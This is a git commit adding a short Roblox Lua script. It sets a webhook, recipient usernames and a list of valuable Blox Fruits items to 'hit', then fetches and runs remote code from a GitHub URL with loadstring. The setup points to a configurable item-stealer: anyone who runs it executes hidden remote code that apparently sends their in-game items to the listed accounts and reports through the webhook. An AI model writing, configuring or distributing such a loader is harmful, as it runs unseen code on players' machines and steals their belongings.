cd3426475cb939453f32d4a828b7ec7172231e50
TradeZv4 <toonplayz.999@gmail.com>
2025-03-16 17:32:37 +0530

    Create Script.lua

---
+++ Script.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=aGFNWkxnbi01R0R2Z1hoTTl6bnVhQTpKcGJqLXA2bHZLVWtwclV5Z3JXbVVIRENCdVhrRUk4RUNJaVJIOHhzMks1cV92aXp0WThmLUVjLUpSeHNMaGtGTHcyeVZvb2hESk9MdTc3UVZNZHBEUWFFZXNiWUFRWmZScUx5eGhqM2h6REd6cnF6cXhTWVFFUzJwR1RRUEs1LThUMjRPSEdWZjluOE85cGRQbjZtc215elFneVNSbGN0dHVjYlJKNzFlbDA" -- << Your Webhook
+Usernames = {"Dragon_5ts", "AeroEagle1"} -- << Your username(-s).
+FruitsToHit = {"Buddha-Buddha","Love-Love","Spider-Spider","Sound-Sound","Phoenix-Phoenix","Portal-Portal","Rumble-Rumble","Pain-Pain","Blizzard-Blizzard","Gravity-Gravity","Mammoth-Mammoth","T-Rex-T-Rex","Dough-Dough","Shadow-Shadow","Venom-Venom","Control-Control","Gas-Gas","Spirit-Spirit","Leopard-Leopard","Yeti-Yeti","Kitsune-Kitsune","Dragon-Dragon"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
